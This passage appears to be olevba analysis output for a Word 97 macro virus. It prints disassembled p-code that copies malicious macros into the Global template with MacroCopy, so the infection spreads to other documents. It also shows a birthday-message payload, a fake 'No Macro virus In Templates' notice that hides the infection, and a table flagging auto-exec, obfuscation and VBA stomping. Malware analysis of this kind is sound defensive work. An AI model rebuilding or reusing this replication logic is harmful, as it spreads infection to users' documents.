' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #25:
' 	Ld NMakro$ 
' 	LitStr 0x0010 "Global:FileMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #27:
' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #28:
' 	Ld NMakro$ 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #29:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tamat 
' Line #30:
' 	Ld NFile$ 
' 	LitStr 0x0006 ":Tools"
' 	Add 
' 	St NMakro$ 
' Line #31:
' 	Ld NMakro$ 
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	OnError tamat 
' Line #33:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #35:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #36:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #37:
' 	LitStr 0x001A "SELAMAT ULANG TAHUN..ALLEN"
' 	MemStWith Then 
' Line #38:
' 	LitStr 0x000F "My heart to you"
' 	MemStWith Heading 
' Line #39:
' 	ArgsMemCallWith Show 0x0000 
' Line #40:
' 	EndWith 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Label tamat 
' Line #43:
' 	EndSub 
' Line #44:
' Macros/VBA/Tools - 2030 bytes
' Line #0:
' 	FuncDefn (Public Sub MAIN())
' Line #1:
' 	OnError tamat 
' Line #2:
' 	Dim 
' 	VarDefn silit
' Line #3:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	IfBlock 
' Line #4:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #5:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #6:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #7:
' 	LitStr 0x001A "SELAMAT ULANG TAHUN..ALLEN"
' 	MemStWith Then 
' Line #8:
' 	LitStr 0x0011 "Salam manis slalu"
' 	MemStWith Heading 
' Line #9:
' 	ArgsMemCallWith Show 0x0000 
' Line #10:
' 	EndWith 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #13:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #14:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #15:
' 	LitStr 0x001B "No Macro virus In Templates"
' 	MemStWith Then 
' Line #16:
' 	LitStr 0x000A "Attention:"
' 	MemStWith Heading 
' Line #17:
' 	ArgsMemCallWith Show 0x0000 
' Line #18:
' 	EndWith 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Label tamat 
' Line #21:
' 	LitStr 0x0016 "No macro in templates "
' 	St silit$ 
' Line #22:
' 	Ld silit$ 
' 	LitStr 0x000F "MS WORD 97 LAHQ"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #23:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

